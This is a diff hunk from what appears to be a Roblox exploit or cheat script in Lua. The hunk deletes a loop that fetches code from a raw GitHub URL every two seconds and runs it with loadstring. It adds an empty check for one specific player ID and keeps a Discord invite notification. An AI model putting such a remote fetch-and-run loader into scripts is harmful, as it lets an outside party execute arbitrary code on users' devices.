@@ -128,18 +128,9 @@ game:GetService("Workspace").DescendantRemoving:Connect(onItemRemoved)
 for _, item in pairs(game.Workspace:GetDescendants()) do
     onItemAdded(item)
 end
+if game.Players.LocalPlayer.UserId == 5307933523 then
 
-local loop = coroutine.wrap(function()
-    while task.wait(2) do
-        local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/ez.lua"))()
-        end)
-        if not success then
-            warn("Error loading script:", errorMessage)
-        end
-    end
-end)
-loop()
+end
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "https://discord.gg/R2dbGKyqqE",
     Text = "Join our community!",
